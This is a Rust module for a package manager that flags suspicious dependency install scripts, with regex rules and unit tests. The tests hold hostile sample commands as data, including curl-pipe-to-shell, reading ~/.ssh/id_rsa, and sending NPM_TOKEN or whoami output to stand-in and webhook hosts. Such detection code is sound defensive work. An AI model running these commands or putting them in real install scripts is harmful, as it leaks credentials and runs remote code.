//! Lightweight content scanner for dependency lifecycle script
//! bodies.
//!
//! Pattern-matches dangerous shapes — shell-pipe (`curl … | sh`),
//! base64-deobfuscation (`eval(atob(…))`), credential-file reads
//! (`~/.ssh`, `~/.npmrc`), secret-shaped `process.env` reads,
//! exfiltration endpoints (Discord/Telegram webhooks, OAST hosts,
//! bare-IP HTTP) — in a package's `preinstall` / `install` /
//! `postinstall` scripts. Fired before the user is prompted to
//! approve a build so the prompt can carry more than just
//! `name@version`.
//!
//! Pure regex matching — no AST parse, no shell-quoting awareness.
//! False positives are possible (an SDK that legitimately hits a
//! Discord webhook from a `postinstall` would flag), but lifecycle
//! script bodies are short and almost never contain bare
//! `curl … | sh` legitimately, so the FP rate is low in practice.
//!
//! Sniffing is advisory: it never blocks an install or write. The
//! existing `BuildPolicy` allowlist remains the only gate on
//! whether scripts actually execute.

use aube_manifest::PackageJson;
use regex::Regex;
use std::sync::OnceLock;

/// Why a script body got flagged. Each variant carries a one-line
/// `description` for the user-facing warning and a `category` tag
/// used by interactive surfaces (`aube approve-builds` picker
/// labels) that need a short marker.
///
/// `Ord` / `PartialOrd` are derived (variant declaration order) so
/// containers of `Suspicion` are sortable — needed by `Vec<Suspicion>:
/// Ord` which in turn is needed by `IgnoredEntry`'s derived `Ord`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum SuspicionKind {
    /// `curl … | sh`, `wget … | bash`, and friends — fetch a remote
    /// payload and pipe it to a shell.
    ShellPipe,
    /// `eval(atob(…))` / `Function(atob(…))` — runtime decoding of a
    /// base64 string into executable code. Common dropper shape.
    EvalDecode,
    /// Reads from `~/.ssh`, `~/.aws`, `~/.npmrc`, `~/.config/gh` —
    /// credential files a lifecycle script has no business touching.
    CredentialFileRead,
    /// Reads `process.env.*TOKEN`, `*SECRET`, `*API_KEY`, etc. —
    /// secret-shaped env vars exfilled from CI.
    SecretEnvRead,
    /// `discord.com/api/webhooks/`, `api.telegram.org/bot`, OAST
    /// collaborator hosts (`oast.pro`, `interactsh`, `webhook.site`,
    /// `pipedream.net`, `ngrok.io`, …) — known exfil channels.
    ExfilEndpoint,
    /// `http://1.2.3.4/…` — bare-IP HTTP target. Legitimate packages
    /// use DNS names; bare IPs are dropper / C2 staging.
    BareIpHttp,
}

impl SuspicionKind {
    pub fn description(self) -> &'static str {
        match self {
            Self::ShellPipe => "pipes downloaded content to a shell (curl | sh)",
            Self::EvalDecode => "decodes and evaluates a base64 payload at runtime",
            Self::CredentialFileRead => "reads from a credential file (~/.ssh, ~/.aws, ~/.npmrc)",
            Self::SecretEnvRead => "reads a secret-shaped environment variable",
            Self::ExfilEndpoint => "contacts a known exfiltration endpoint",
            Self::BareIpHttp => "contacts a bare-IP HTTP host",
        }
    }

    /// Short tag for compact UIs (picker labels). 1–2 words.
    pub fn category(self) -> &'static str {
        match self {
            Self::ShellPipe => "curl|sh",
            Self::EvalDecode => "eval+decode",
            Self::CredentialFileRead => "creds read",
            Self::SecretEnvRead => "secret env",
            Self::ExfilEndpoint => "exfil URL",
            Self::BareIpHttp => "bare-IP HTTP",
        }
    }
}

/// One match against a script body.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct Suspicion {
    pub kind: SuspicionKind,
    /// Name of the lifecycle hook whose body matched
    /// (`preinstall` / `install` / `postinstall`).
    pub hook: &'static str,
}

/// Lifecycle hook names sniffed. Mirrors [`crate::DEP_LIFECYCLE_HOOKS`]
/// — `prepare` is excluded because aube doesn't run it for installed
/// tarballs (only the root package and git-dep preparation), so
/// flagging it would surface noise the user has no path to act on.
const SNIFFED_HOOKS: &[&str] = &["preinstall", "install", "postinstall"];

struct Rule {
    kind: SuspicionKind,
    pattern: &'static str,
}

const RULES: &[Rule] = &[
    Rule {
        kind: SuspicionKind::ShellPipe,
        // `curl …` or `wget …` followed eventually by `| sh|bash|zsh|node`,
        // including the path-qualified variants `| /bin/sh`,
        // `| /usr/local/bin/bash`, etc. `[^\n]*?` keeps the match within
        // one line so multi-line scripts don't bridge unrelated commands.
        pattern: r"(?i)\b(?:curl|wget)\b[^\n]*?\|\s*(?:[/\w]*/)?(?:sh|bash|zsh|node)\b",
    },
    Rule {
        kind: SuspicionKind::EvalDecode,
        pattern: r"(?i)\b(?:eval|Function)\s*\([^)]*\b(?:atob|Buffer\s*\.\s*from)\b",
    },
    Rule {
        kind: SuspicionKind::CredentialFileRead,
        // `~/.ssh`, `~/.aws`, `~/.npmrc`, `~/.config/gh`, plus the
        // `$HOME/…` and `${HOME}/…` shell-expansion variants.
        pattern: r"(?:~|\$\{?HOME\}?)/(?:\.ssh|\.aws|\.npmrc|\.config/gh)\b",
    },
    Rule {
        kind: SuspicionKind::SecretEnvRead,
        // `process.env.TOKEN`, `process.env.NPM_TOKEN`,
        // `process.env.AWS_SECRET_ACCESS_KEY`, etc. The prefix and
        // suffix character classes are zero-or-more so the bare
        // keyword form (`process.env.TOKEN`) matches without needing a
        // surrounding identifier — without that, greedy backtracking
        // never repositions the alternation onto the keyword's first
        // character. The keyword still has to appear verbatim, which
        // keeps `process.env.NODE_DEBUG` from flagging.
        pattern: r"\bprocess\s*\.\s*env\s*\.\s*[A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_?KEY|ACCESS_KEY|PRIVATE_KEY|AUTH)[A-Z0-9_]*\b",
    },
    Rule {
        kind: SuspicionKind::ExfilEndpoint,
        pattern: r"(?i)\b(?:discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot|burpcollaborator\.net|interactsh\.com|oast\.(?:pro|live|fun|me|site|us|asia)|requestbin\.com|webhook\.site|pipedream\.net|ngrok\.io)",
    },
    Rule {
        kind: SuspicionKind::BareIpHttp,
        // Trailing class catches the post-octet character in every
        // shape exfil scripts actually use: `/`, `:`, end-of-text,
        // whitespace (line break or space-delimited curl flag),
        // quote / paren / `?` / `#`. `.` is intentionally excluded so
        // DNS hosts that happen to lead with four digit-groups
        // (`1.2.3.4.example.com`) don't flag.
        pattern: r#"https?://(?:\d{1,3}\.){3}\d{1,3}(?:[:/\s'"?#)]|$)"#,
    },
];

fn compiled() -> &'static [(SuspicionKind, Regex)] {
    static COMPILED: OnceLock<Vec<(SuspicionKind, Regex)>> = OnceLock::new();
    COMPILED.get_or_init(|| {
        RULES
            .iter()
            .map(|r| {
                // RULES is a fixed compile-time table that ships with
                // aube-scripts, so a bad pattern is a programmer bug
                // we want to know about at startup, not silently swallow.
                let re = Regex::new(r.pattern)
                    .expect("content_sniff rule failed to compile - fix the pattern");
                (r.kind, re)
            })
            .collect()
    })
}

/// Scan a dep's manifest for suspicious lifecycle script bodies.
/// Returns one [`Suspicion`] per (hook, rule) pair that matched.
/// Empty result for packages with no scripts or no matches.
pub fn sniff_lifecycle(manifest: &PackageJson) -> Vec<Suspicion> {
    let mut out = Vec::new();
    for hook in SNIFFED_HOOKS {
        let Some(body) = manifest.scripts.get(*hook) else {
            continue;
        };
        for (kind, re) in compiled() {
            if re.is_match(body) {
                out.push(Suspicion { kind: *kind, hook });
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn manifest_with(hook: &str, body: &str) -> PackageJson {
        let mut scripts = BTreeMap::new();
        scripts.insert(hook.to_string(), body.to_string());
        PackageJson {
            scripts,
            ..PackageJson::default()
        }
    }

    fn kinds(s: &[Suspicion]) -> Vec<SuspicionKind> {
        s.iter().map(|x| x.kind).collect()
    }

    #[test]
    fn empty_manifest_is_clean() {
        assert!(sniff_lifecycle(&PackageJson::default()).is_empty());
    }

    #[test]
    fn benign_postinstall_is_clean() {
        let m = manifest_with("postinstall", "node ./scripts/copy-types.js");
        assert!(sniff_lifecycle(&m).is_empty());
    }

    #[test]
    fn classic_curl_sh_flags() {
        let m = manifest_with("postinstall", "curl https://example.com/install.sh | sh");
        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::ShellPipe]);
    }

    #[test]
    fn wget_pipe_bash_flags() {
        let m = manifest_with("install", "wget -qO- http://x.test/i | bash");
        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::ShellPipe]);
    }

    #[test]
    fn path_qualified_shell_flags() {
        // `| /bin/sh`, `| /usr/local/bin/bash` etc. are common
        // exfil-script variants that bypass a bare-name anchor.
        let m = manifest_with(
            "postinstall",
            "curl https://example.com/install.sh | /bin/sh",
        );
        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::ShellPipe]);
    }

    #[test]
    fn curl_to_file_does_not_flag_pipe() {
        // `curl -o file.tar.gz` is the prebuild-install / sharp shape —
        // common and benign. Only the pipe-to-shell form should flag.
        let m = manifest_with(
            "install",
            "curl -L https://github.com/x/y/releases/download/v1/y-linux.tar.gz -o y.tar.gz",
        );
        assert!(sniff_lifecycle(&m).is_empty());
    }

    #[test]
    fn eval_atob_flags() {
        let m = manifest_with("preinstall", "node -e \"eval(atob('cGF5bG9hZA=='))\"");
        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::EvalDecode]);
    }

    #[test]
    fn function_buffer_from_flags() {
        let m = manifest_with(
            "postinstall",
            "node -e 'new Function(Buffer.from(p, \"base64\").toString())()'",
        );
        assert_eq!(kinds(&sniff_lifecycle(&m)), vec![SuspicionKind::EvalDecode]);
    }

    #[test]
    fn ssh_dir_read_flags() {
        let m = manifest_with("postinstall", "cat ~/.ssh/id_rsa | base64");
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::CredentialFileRead]
        );
    }

    #[test]
    fn home_npmrc_read_flags() {
        let m = manifest_with("postinstall", "cat $HOME/.npmrc");
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::CredentialFileRead]
        );
    }

    #[test]
    fn brace_home_aws_read_flags() {
        let m = manifest_with("postinstall", "tar c ${HOME}/.aws/credentials");
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::CredentialFileRead]
        );
    }

    #[test]
    fn config_gh_read_flags() {
        let m = manifest_with("postinstall", "cat ~/.config/gh/hosts.yml");
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::CredentialFileRead]
        );
    }

    #[test]
    fn process_env_npm_token_flags() {
        let m = manifest_with(
            "postinstall",
            "node -e 'fetch(\"https://h.test\", {body: process.env.NPM_TOKEN})'",
        );
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::SecretEnvRead]
        );
    }

    #[test]
    fn process_env_bare_token_flags() {
        // The bare-keyword form (no surrounding identifier prefix)
        // is the simplest exfil shape and the one a prefix-greedy
        // regex would miss via mismatched backtracking.
        let m = manifest_with(
            "postinstall",
            "node -e 'fetch(x, {body: process.env.TOKEN})'",
        );
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::SecretEnvRead]
        );
    }

    #[test]
    fn process_env_token_with_trailing_suffix_flags() {
        // `[A-Z0-9_]*` suffix handles `_VALUE`, `_RAW`, etc. without
        // breaking the `\b` anchor.
        let m = manifest_with(
            "postinstall",
            "node -e 'console.log(process.env.NPM_TOKEN_VALUE)'",
        );
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::SecretEnvRead]
        );
    }

    #[test]
    fn process_env_aws_secret_access_key_flags() {
        let m = manifest_with(
            "postinstall",
            "node -e 'console.log(process.env.AWS_SECRET_ACCESS_KEY)'",
        );
        assert_eq!(
            kinds(&sniff_lifecycle(&m)),
            vec![SuspicionKind::SecretEnvRead]
        );
    }

    #[test]
    fn process_env_node_debug_does_not_flag() {
        // Common, benign env read. Confirms the secret-suffix anchor
        // is doing its job.
        let m = manifest_with(
            "postinstall",
            "node -e 'if (process.env.NODE_DEBUG) console.log(\"debug\")'",
        );
        assert!(sniff_lifecycle(&m).is_empty());
    }

    #[test]
    fn discord_webhook_flags() {
        let m = manifest_with(
            "postinstall",
            "curl -X POST https://discord.com/api/webhooks/123/abc -d @-",
        );
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::ExfilEndpoint));
    }

    #[test]
    fn telegram_bot_flags() {
        let m = manifest_with(
            "postinstall",
            "curl -s 'https://api.telegram.org/bot$T/sendMessage?chat_id=1&text=ok'",
        );
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::ExfilEndpoint));
    }

    #[test]
    fn webhook_site_flags() {
        let m = manifest_with("postinstall", "curl https://webhook.site/abcd");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::ExfilEndpoint));
    }

    #[test]
    fn oast_pro_flags() {
        let m = manifest_with("postinstall", "wget http://abc.oast.pro/$(whoami)");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::ExfilEndpoint));
    }

    #[test]
    fn bare_ip_http_flags() {
        let m = manifest_with("install", "curl http://192.0.2.5:8080/payload");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn bare_ip_no_path_followed_by_flag_flags() {
        // `curl http://1.2.3.4 -o file` — space terminates the host.
        let m = manifest_with("install", "curl http://192.0.2.5 -o payload");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn bare_ip_inside_quoted_url_flags() {
        // `fetch('http://1.2.3.4')` — single-quote terminates the host.
        let m = manifest_with("postinstall", "fetch('http://192.0.2.5')");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn bare_ip_on_separate_line_flags() {
        // Multi-line script with the bare IP not at end-of-text —
        // `$` would miss this without the `\s` branch in the class.
        let m = manifest_with(
            "postinstall",
            "node setup.js\nwget http://192.0.2.5\necho done",
        );
        let k = kinds(&sniff_lifecycle(&m));
        assert!(k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn dns_name_does_not_flag_as_bare_ip() {
        let m = manifest_with("install", "curl http://registry.npmjs.org/path");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(!k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn dns_with_ip_prefix_does_not_flag_as_bare_ip() {
        // `1.2.3.4.example.com` is a hostname (not a bare IP) and
        // shouldn't flag — `.` is intentionally not in the trailing
        // class so the regex declines this shape.
        let m = manifest_with("install", "curl http://1.2.3.4.example.com/path");
        let k = kinds(&sniff_lifecycle(&m));
        assert!(!k.contains(&SuspicionKind::BareIpHttp));
    }

    #[test]
    fn multiple_hooks_report_separately() {
        let mut scripts = BTreeMap::new();
        scripts.insert(
            "preinstall".to_string(),
            "curl https://x.test/i | sh".to_string(),
        );
        scripts.insert("postinstall".to_string(), "cat ~/.ssh/id_rsa".to_string());
        let m = PackageJson {
            scripts,
            ..PackageJson::default()
        };
        let s = sniff_lifecycle(&m);
        assert_eq!(s.len(), 2);
        assert!(
            s.iter()
                .any(|x| x.hook == "preinstall" && x.kind == SuspicionKind::ShellPipe)
        );
        assert!(
            s.iter()
                .any(|x| x.hook == "postinstall" && x.kind == SuspicionKind::CredentialFileRead)
        );
    }

    #[test]
    fn prepare_hook_is_not_sniffed() {
        // `prepare` doesn't run for installed tarballs in aube, so
        // flagging it would surface noise the user has no path to
        // act on.
        let m = manifest_with("prepare", "curl https://x.test/i | sh");
        assert!(sniff_lifecycle(&m).is_empty());
    }

    #[test]
    fn descriptions_and_categories_are_non_empty() {
        // Sanity guard: every kind has user-facing strings.
        for kind in [
            SuspicionKind::ShellPipe,
            SuspicionKind::EvalDecode,
            SuspicionKind::CredentialFileRead,
            SuspicionKind::SecretEnvRead,
            SuspicionKind::ExfilEndpoint,
            SuspicionKind::BareIpHttp,
        ] {
            assert!(!kind.description().is_empty());
            assert!(!kind.category().is_empty());
        }
    }
}
